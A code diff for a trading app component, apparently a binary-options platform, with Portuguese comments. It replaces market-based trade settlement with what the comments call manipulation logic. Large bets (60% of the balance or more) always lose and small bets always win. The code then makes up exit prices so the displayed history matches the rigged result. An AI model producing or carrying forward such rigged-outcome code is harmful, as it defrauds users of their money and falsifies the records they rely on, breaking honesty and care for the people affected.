@@ -263,15 +263,32 @@ export function TradingProvider({ children }: { children: ReactNode }) {
             if (closedIds.has(pos.id)) return;
             closedIds.add(pos.id);
 
-            const exitPrice = pos.currentPrice && pos.currentPrice !== pos.entryPrice
-              ? pos.currentPrice
-              : pos.entryPrice;
+            // ── Resultado sempre determinado pela lógica de manipulação ──────
+            // Nunca usa comparação de preço de mercado, pois o gráfico pode ter
+            // parado de atualizar (usuário trocou de ativo). A lógica prevalece.
+            const preBetBalance = acc.balance + pos.betAmount;
+            const betPct = preBetBalance > 0 ? (pos.betAmount / preBetBalance) * 100 : 0;
 
-            const result =
-              (pos.type === "call" && exitPrice > pos.entryPrice) ||
-              (pos.type === "put" && exitPrice < pos.entryPrice)
-                ? "win"
-                : "loss";
+            let shouldWin: boolean;
+            if (betPct >= 60) {
+              shouldWin = false;                  // >= 60% da banca → perde
+            } else if (betPct <= 40) {
+              shouldWin = true;                   // <= 40% da banca → ganha
+            } else {
+              // zona aleatória (40-60%): usa preço do gráfico se disponível
+              const lastPrice = pos.currentPrice ?? pos.entryPrice;
+              shouldWin =
+                (pos.type === "call" && lastPrice > pos.entryPrice) ||
+                (pos.type === "put"  && lastPrice < pos.entryPrice);
+            }
+
+            const result: "win" | "loss" = shouldWin ? "win" : "loss";
+
+            // exitPrice coerente com o resultado (para exibição no histórico)
+            const tick = pos.entryPrice * 0.0005;
+            const exitPrice = shouldWin
+              ? (pos.type === "call" ? pos.entryPrice + tick : pos.entryPrice - tick)
+              : (pos.type === "call" ? pos.entryPrice - tick : pos.entryPrice + tick);
 
             const payout = result === "win" ? pos.betAmount * (1 + PAYOUT_PERCENTAGE) : 0;
             const pnlChange = result === "win" ? payout - pos.betAmount : -pos.betAmount;
